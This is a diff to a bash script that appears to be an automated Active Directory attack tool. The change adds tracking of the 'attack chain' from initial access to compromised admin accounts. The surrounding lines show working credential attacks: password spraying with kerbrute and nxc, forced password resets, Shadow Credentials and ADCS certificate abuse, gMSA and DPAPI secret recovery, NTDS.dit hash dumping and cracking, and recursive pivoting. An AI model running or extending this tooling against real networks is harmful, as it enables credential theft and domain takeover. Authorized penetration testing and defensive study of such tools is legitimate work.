@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.11.1"
+readonly VERSION="1.12.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -164,6 +164,8 @@ declare -A TRIED_HASHES=()        # per-account (krb) or per-hash (ntlm) → alr
 declare -A OWNED_GROUPS=()        # compromised user (lowercased) → group memberships
 declare -A OWNED_ADMIN=()         # compromised user (lowercased) → 1 if privileged/admin
 declare -A REQUEUED_SELF=()       # user (lc) re-assessed once after a self-group-add (no loops)
+declare -A CHAIN_FROM=()          # identity (lc) → the identity we pivoted FROM to reach it
+declare -A CHAIN_VIA=()           # identity (lc) → the technique that yielded it
 KERB_DONE=0                       # Kerberoast request runs once (SPN set is domain-wide)
 # Groups that mean "this account is effectively privileged" → crown it in the summary
 ADMIN_GROUP_RE='Domain Admins|Enterprise Admins|Schema Admins|Administrators|Account Operators|Backup Operators|Server Operators|Print Operators|DnsAdmins|Group Policy Creator Owners|Enterprise Key Admins|Key Admins|Domain Controllers'
@@ -250,13 +252,19 @@ rb_record() {  # rb_record "<human description>" "<shell command that undoes it>
 # ---------------------------------------------------------------------------
 #  CREDENTIAL QUEUE  (drives recursive pivoting)
 # ---------------------------------------------------------------------------
-queue_cred() {  # queue_cred <user> <password|""> <nthash|"">
-    local u="$1" p="$2" h="$3"
+queue_cred() {  # queue_cred <user> <password|""> <nthash|""> [via-technique]
+    local u="$1" p="$2" h="$3" via="${4:-pivot}"
     if ! _is_valid_identity "$u"; then
         [[ -n "$u" ]] && err "Ignoring implausible identity '$u' (looks like a path/filename)"
         return
     fi
     local key="${u,,}"
+    # Record the attack-chain edge (the identity we're acting as --via--> this one)
+    # the FIRST time we learn of it — even if already seen/queued — so the final
+    # "attack chain" is complete. A self-reference (root / self-reset) is skipped.
+    if [[ -z "${CHAIN_VIA[$key]:-}" && -n "${USER,,}" && "${USER,,}" != "$key" ]]; then
+        CHAIN_FROM["$key"]="${USER,,}"; CHAIN_VIA["$key"]="$via"
+    fi
     [[ -n "${SEEN_CREDS[$key]:-}" ]] && return   # already assessed this identity
     # Also skip if it's already waiting in the queue (case-insensitive): tools
     # report names in different cases (kerbrute 'Bob' vs nxc 'bob') and
@@ -967,7 +975,7 @@ phase_secrets() {
         [[ -n "$acc" && -n "$h" ]] && {
             loot "★ gMSA hash recovered for ${C_BOLD}$acc${C_RESET}: ${C_MAGENTA}$h${C_RESET}"
             note_cred_source "$acc" "gMSA password read (NT hash)"
-            queue_cred "$acc" "" "$h"; }
+            queue_cred "$acc" "" "$h" "ReadGMSAPassword"; }
     done < <(echo "$gmsa" | grep -iE 'Account:.*NTLM:')
 }
 
@@ -1396,7 +1404,7 @@ _abuse_user() {
         loot "★ Password of '${target}' reset → pivoting as that user"
         rb_record "Reset password of $target (ORIGINAL UNKNOWN — coordinate restore with client)" \
                   "echo 'Manual action required: restore original password for $target'"
-        queue_cred "$target" "$PIVOT_PW" ""
+        queue_cred "$target" "$PIVOT_PW" "" "ForceChangePassword/GenericAll reset"
         return 0
     else
         warn "Failed to reset '$target' password"
@@ -1465,7 +1473,7 @@ _abuse_shadowcred() {
     if [[ "$nt" =~ ^[a-fA-F0-9]{32}$ ]]; then
         loot "★ Shadow Credentials → NT hash of ${C_BOLD}$target${C_RESET}: ${C_MAGENTA}$nt${C_RESET}"
         note_cred_source "$target" "Shadow Credentials (msDS-KeyCredentialLink)"
-        queue_cred "$target" "" "$nt"
+        queue_cred "$target" "" "$nt" "Shadow Credentials"
         return 0
     fi
     warn "Shadow Credentials did not yield a hash for $target"; return 1
@@ -1593,7 +1601,7 @@ _adcs_pwn_pfx() {                       # _adcs_pwn_pfx <pfx-basename> <label> [
     local nt; nt=$(grep -oiP 'Got hash for .*:\s*\K[a-f0-9]{32}:[a-f0-9]{32}' <<<"$aout" | awk -F: '{print $NF}' | head -1)
     if [[ "$nt" =~ ^[a-fA-F0-9]{32}$ ]]; then
         loot "★★★ ${label} → ${who} NT hash: ${C_MAGENTA}$nt${C_RESET}"
-        note_cred_source "$who" "ADCS ${label} (certipy)"; queue_cred "$who" "" "$nt"; return 0
+        note_cred_source "$who" "ADCS ${label} (certipy)"; queue_cred "$who" "" "$nt" "ADCS ${label}"; return 0
     fi
     local cc; cc=$(ls -t "$OUTDIR"/${who}*.ccache "$OUTDIR"/*.ccache 2>/dev/null | head -1)
     [[ -n "$cc" ]] && { loot "${label} → ${who} TGT cached → $(basename "$cc") (export KRB5CCNAME=)"; return 0; }
@@ -1805,7 +1813,7 @@ phase_recycle_disabled() {
                         loot "★ Reset restored account '${sam}' → pivoting as it"
                         note_cred_source "$sam" "AD Recycle Bin restore + password reset"
                         rb_record "Reset password of restored $sam (ORIGINAL UNKNOWN)" "echo 'Manual: coordinate password restore for $sam'"
-                        queue_cred "$sam" "$PIVOT_PW" ""
+                        queue_cred "$sam" "$PIVOT_PW" "" "AD Recycle Bin restore + reset"
                     fi
                 fi
             done < <(echo "$del" | awk '
@@ -1971,7 +1979,7 @@ phase_ntds_local() {
         done
         while read -r l; do
             local h; h=$(echo "$l" | cut -d: -f4)
-            loot "ADMINISTRATOR hash: $h"; queue_cred "Administrator" "" "$h"
+            loot "ADMINISTRATOR hash: $h"; queue_cred "Administrator" "" "$h" "NTDS.dit offline dump"
         done < <(grep -iE '^administrator:' "$OUTDIR/ntds_local.txt" | head -1)
         [[ "$DO_CRACK" == "1" ]] && {
             grep -E ':::' "$OUTDIR/ntds_local.txt" | awk -F: '{print $4}' | sort -u >"$OUTDIR/ntds_ntlm.txt"
@@ -2097,7 +2105,7 @@ phase_dpapi_offline() {
         [[ -n "$p" ]] && _plausible_secret "$p" || return 1
         loot "★★ DPAPI secret recovered → ${C_GREEN}${u:-?} : ${p}${C_RESET}"
         add_secret "$p" "DPAPI offline ($src)"
-        [[ -n "$u" ]] && { note_cred_source "${u}:${p}" "DPAPI offline decrypt"; queue_cred "$u" "$p" ""; }
+        [[ -n "$u" ]] && { note_cred_source "${u}:${p}" "DPAPI offline decrypt"; queue_cred "$u" "$p" "" "DPAPI offline decrypt"; }
         return 0
     }
 
@@ -2195,7 +2203,7 @@ _spray_one() {
             [[ -z "$u" ]] && continue
             loot "★ Valid credential found by spray → ${C_GREEN}${u} : ${pw}${C_RESET}"
             note_cred_source "${u}:${pw}" "password spray (kerbrute)"
-            queue_cred "$u" "$pw" ""
+            queue_cred "$u" "$pw" "" "password spray"
         done < <("$KERBRUTE_BIN" passwordspray -d "$DOMAIN" --dc "$DC_IP" "$OUTDIR/users_all.txt" "$pw" 2>&1 \
                    | tee -a "$LOGFILE" | grep -i 'VALID LOGIN' | grep -oiP 'VALID LOGIN:\s+\K\S+?(?=@)')
     else
@@ -2209,7 +2217,7 @@ _spray_one() {
             loot "★ Valid credential found by spray → ${C_GREEN}${u} : ${pw}${C_RESET}"
             note_cred_source "${u}:${pw}" "password spray (nxc)"
             echo "$line" | grep -qi 'Pwn3d' && loot "  ↳ ${u} is LOCAL ADMIN where sprayed"
-            queue_cred "$u" "$pw" ""
+            queue_cred "$u" "$pw" "" "password spray"
         done < <($NXC smb "$DCT" -u "$OUTDIR/users_all.txt" -p "$pw" "${kflag[@]}" --continue-on-success 2>&1 \
                    | tee -a "$LOGFILE" | grep -iE '\[\+\]')
     fi
@@ -2342,7 +2350,7 @@ crack_hashes() {
                     local nt="${line%%:*}"
                     user=$(grep -iE ":${nt}:::" "$OUTDIR/secretsdump.txt" 2>/dev/null | head -1 | cut -d: -f1) ;;
             esac
-            [[ -n "$user" && -n "$pw" ]] && queue_cred "$user" "$pw" ""
+            [[ -n "$user" && -n "$pw" ]] && queue_cred "$user" "$pw" "" "$label cracked"
         done <<<"$cracked"
     else
         info "Nothing cracked for $label with this wordlist"
@@ -3359,6 +3367,28 @@ gen_report() {
     ok "Consolidated report → report.md"
 }
 
+# Render the pivot path that led to one identity (root → … → node), top-down,
+# stepping one indent per hop and labelling each hop with the technique used.
+_render_chain() {
+    local cur="$1" seen="" chain=()
+    while [[ -n "$cur" ]]; do
+        chain=("$cur" "${chain[@]}")
+        [[ "$seen" == *"|${cur}|"* ]] && break          # cycle guard
+        seen="${seen}|${cur}|"
+        cur="${CHAIN_FROM[$cur]:-}"
+    done
+    local i n via pad crown
+    for ((i=0; i<${#chain[@]}; i++)); do
+        n="${chain[i]}"; crown=""; [[ -n "${OWNED_ADMIN[$n]:-}" ]] && crown="  ${C_YELLOW}👑${C_RESET}"
+        if (( i==0 )); then
+            detail "      ${C_GREEN}${C_BOLD}${n}${C_RESET}${crown} ${C_DIM}(start)${C_RESET}"
+        else
+            via="${CHAIN_VIA[$n]:-pivot}"; pad="$(printf '%*s' $((i*2)) '')"
+            detail "      ${pad}${C_GREY}└─${C_RESET} ${C_PURPLE}${via}${C_RESET} ${C_GREY}▶${C_RESET} ${C_BOLD}${n}${C_RESET}${crown}"
+        fi
+    done
+}
+
 # ===========================================================================
 #  FINAL SUMMARY
 # ===========================================================================
@@ -3404,6 +3434,29 @@ final_summary() {
             detail "      ${C_GREEN}${_u}${C_RESET}  ${C_DIM}${OWNED_GROUPS[$_u]}${C_RESET}"
         done < <(for k in "${!OWNED_GROUPS[@]}"; do [[ -z "${OWNED_ADMIN[$k]:-}" ]] && printf '%s\n' "$k"; done | sort)
         ok "${#OWNED_GROUPS[@]} compromised (${#OWNED_ADMIN[@]} admin) → owned_principals.txt"
+    fi
+
+    # Attack chain — the path of pivots that connected initial access to our
+    # highest-value identities (built from the edges recorded as each identity
+    # was obtained: which account we were, and the technique that yielded it).
+    if [[ ${#CHAIN_VIA[@]} -gt 0 ]]; then
+        section "ATTACK CHAIN · the path we followed"
+        local k; local -A _isparent=()
+        for k in "${!CHAIN_FROM[@]}"; do _isparent["${CHAIN_FROM[$k]}"]=1; done
+        local -a targets=()
+        if [[ ${#OWNED_ADMIN[@]} -gt 0 ]]; then          # show the path(s) to each admin we landed
+            for k in "${!OWNED_ADMIN[@]}"; do targets+=("$k"); done
+        else                                              # else the chain endpoints (leaves)
+            for k in "${!CHAIN_VIA[@]}"; do [[ -z "${_isparent[$k]:-}" ]] && targets+=("$k"); done
+        fi
+        [[ ${#targets[@]} -eq 0 ]] && for k in "${!CHAIN_VIA[@]}"; do targets+=("$k"); done
+        local t first=1
+        while IFS= read -r t; do
+            [[ -z "$t" ]] && continue
+            [[ "$first" == 1 ]] || detail ""
+            first=0; _render_chain "$t"
+        done < <(printf '%s\n' "${targets[@]}" | sort -u)
+        ok "Attack chain mapped above"
     fi
 
     # ----- FULL HARVEST: everything recovered, in detail + colour -----------
